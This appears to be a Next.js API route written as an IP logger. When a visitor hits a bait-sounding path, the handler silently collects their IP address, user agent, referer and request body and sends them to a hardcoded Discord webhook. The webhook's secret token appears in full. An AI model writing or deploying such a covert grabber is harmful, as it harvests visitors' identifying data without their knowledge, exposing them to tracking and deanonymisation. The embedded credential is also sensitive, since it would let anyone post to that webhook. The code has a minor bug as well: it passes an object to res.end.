import { NextApiRequest, NextApiResponse } from "next";

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
    let content = `**Visit of /mc/sex**:
    IP: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress},
    User-Agent: ${req.headers['user-agent'] || 'Unknown'},
    Referer: ${req.headers['referer'] || 'Unknown'},
    Time: ${new Date().toLocaleString()},
    Method: ${req.method},
    Body: ${JSON.stringify(req.body)}`;
    fetch("https://discord.com/api/webhooks/1049404188846727299/-TNhDH1vvj7FJuiQAJ5ZshpxnyTp22OQv3EeLRwnHr4K4t2iGwKqzkG-K8Rxrl_07E7g", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "content": content
        })
    });
    res.end({"status": "ok"})
}